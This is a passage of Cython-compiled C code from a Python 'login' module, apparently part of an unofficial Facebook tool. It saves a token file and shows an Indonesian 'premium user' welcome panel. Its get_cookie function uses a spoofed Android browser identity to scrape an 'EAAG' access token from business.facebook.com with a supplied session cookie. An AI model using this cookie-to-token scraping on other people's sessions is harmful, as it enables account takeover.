      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_json); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_name); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 141, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_nama = __pyx_t_7;
      __pyx_t_7 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_v_token) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_token);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 142, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_prints); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_Panel); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_9 = 0;
      __pyx_t_10 = 127;
      __Pyx_INCREF(__pyx_kp_u_bold_white_Selamat_Datang_bold);
      __pyx_t_9 += 40;
      __Pyx_GIVEREF(__pyx_kp_u_bold_white_Selamat_Datang_bold);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_bold_white_Selamat_Datang_bold);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_nama, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
      __Pyx_GIVEREF(__pyx_t_11);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_11);
      __pyx_t_11 = 0;
      __Pyx_INCREF(__pyx_kp_u_bold_white_User_Premium);
      __pyx_t_9 += 25;
      __Pyx_GIVEREF(__pyx_kp_u_bold_white_User_Premium);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_bold_white_User_Premium);
      __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_6, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_8, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 143, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 144, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 144, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 144, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 145, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 145, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 145, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 145, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("login.get_token", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_7, &__pyx_t_4) < 0) __PYX_ERR(0, 146, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_4);

      
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 147, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 147, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_kp_u_rm_f_data_token_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_rm_f_data_token_txt);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 147, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 148, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_prints); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 149, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_Panel); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 149, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_13);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_13, function);
        }
      }
      __pyx_t_11 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_13, __pyx_t_14, __pyx_kp_u_bold_red_Token_invalid_atau_tid) : __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_kp_u_bold_red_Token_invalid_atau_tid);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 149, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_13)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_13);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_8 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_13, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_11);
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 149, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_sys); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 150, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_exit); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 150, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_11);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_11, function);
        }
      }
      __pyx_t_8 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 150, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("login.get_token", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_11get_cookie(PyObject *__pyx_self, PyObject *__pyx_v_cookie); 
static PyMethodDef __pyx_mdef_5login_11get_cookie = {"get_cookie", (PyCFunction)__pyx_pw_5login_11get_cookie, METH_O, 0};
static PyObject *__pyx_pw_5login_11get_cookie(PyObject *__pyx_self, PyObject *__pyx_v_cookie) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_cookie (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_10get_cookie(__pyx_self, ((PyObject *)__pyx_v_cookie));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_10get_cookie(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_cookie) {
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_find_token = NULL;
  PyObject *__pyx_v_nama = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  Py_UCS4 __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  char const *__pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_cookie", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ses); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_8_1_0) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_referer, __pyx_kp_u_https_www_facebook_com) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_host, __pyx_kp_u_business_facebook_com) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_origin, __pyx_kp_u_https_business_facebook_com) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_upgrade_insecure_requests, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_accept_language, __pyx_kp_u_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_cache_control, __pyx_kp_u_max_age_0) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_accept, __pyx_kp_u_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_content_type, __pyx_kp_u_text_html_charset_utf_8) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_t_6) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_cookie, __pyx_v_cookie) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_cookies, __pyx_t_6) < 0) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__18, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 154, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_data = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_re); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 155, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_search); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 155, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_data, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 155, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_7 = NULL;
      __pyx_t_8 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
          __pyx_t_8 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_5)) {
        PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_u_EAAG_w, __pyx_t_4};
        __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 155, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
        PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_u_EAAG_w, __pyx_t_4};
        __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_8, 2+__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 155, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      } else
      #endif
      {
        __pyx_t_9 = PyTuple_New(2+__pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 155, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        if (__pyx_t_7) {
          __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_7); __pyx_t_7 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_EAAG_w);
        __Pyx_GIVEREF(__pyx_kp_u_EAAG_w);
        PyTuple_SET_ITEM(__pyx_t_9, 0+__pyx_t_8, __pyx_kp_u_EAAG_w);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_9, 1+__pyx_t_8, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_9, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 155, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_find_token = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ses); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
